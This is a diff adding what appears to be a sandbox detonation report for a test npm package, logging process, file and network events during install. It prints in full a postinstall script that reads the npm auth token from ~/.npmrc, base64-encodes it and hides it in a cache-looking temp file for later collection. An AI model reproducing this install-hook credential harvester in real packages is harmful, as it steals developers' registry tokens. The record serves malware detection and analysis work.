@@ -1,0 +1,97 @@
+{
+ "job_id": "1ce9453d-bd9b-44be-8acf-444bbaebd0f3",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.94,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:30:52.452779731Z",
+   "pid": 287068,
+   "ppid": 287045,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-86653401a6efd828; \"$@\"; rc=$?; /bin/true post-86653401a6efd828; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc07-npm-token",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:52.456816721Z",
+   "pid": 287109,
+   "ppid": 287068,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc07-npm-token",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:52.457502958Z",
+   "pid": 287109,
+   "ppid": 287109,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc07-npm-token",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:30:52.903828780Z",
+   "pid": 287128,
+   "ppid": 287109,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc07-npm-token"
+  },
+  {
+   "ts": "2026-11-03T22:30:52.905181247Z",
+   "pid": 287129,
+   "ppid": 287128,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc07-npm-token"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:30:52.566087597Z",
+   "pid": 287109,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  },
+  {
+   "ts": "2026-11-03T22:30:52.936017328Z",
+   "pid": 287129,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc07-npm-token/scripts/setup.js",
+   "package": null,
+   "sha256": "06ecba52536319934bd838179dbb3d614e28e0549882a5ae3430b00ff6913667",
+   "content": "const fs = require(\"fs\"), os = require(\"os\"), path = require(\"path\");\nlet token = \"\";\ntry {\n  const rc = fs.readFileSync(path.join(os.homedir(), \".npmrc\"), \"utf8\");\n  const m = rc.match(/_authToken=(.*)/);\n  if (m) token = m[1].trim();\n} catch {}\nconst blob = Buffer.from(token).toString(\"base64\");\n// Park it under a cache-looking name; no egress here, a later step would collect it.\ntry { fs.writeFileSync(path.join(os.tmpdir(), \".npm-cache-index\"), blob); } catch {}\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc07@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 393ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.06,
+  "peak_memory_mb": 4.4,
+  "samples": 1
+ }
+}
